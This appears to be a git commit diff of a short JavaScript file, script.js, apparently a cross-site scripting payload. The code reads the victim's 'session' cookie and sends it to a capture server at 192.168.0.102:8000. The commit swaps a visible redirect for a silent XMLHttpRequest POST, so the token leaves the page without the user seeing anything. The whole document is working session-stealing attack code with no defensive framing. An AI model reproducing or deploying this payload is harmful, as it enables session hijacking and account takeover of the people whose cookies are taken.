a772779fccbd8d9361f2f345806cfc85811dd59c
jondaveyan <jon.daveyan@gmail.com>
2024-04-17 15:08:18 +0400

    Update script.js

--- script.js
+++ script.js
@@ -1,3 +1,5 @@
 var xhr = new XMLHttpRequest();
 var token = document.cookie.split(';').find(cookie => cookie.trim().startsWith('session=')).split('=')[1];
-window.location.href ='http://192.168.0.102:8000/capture?token='+encodeURIComponent(token);
+xhr.open('POST', 'http://192.168.0.102:8000/capture', true);
+xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+xhr.send('token=' + encodeURIComponent(token));
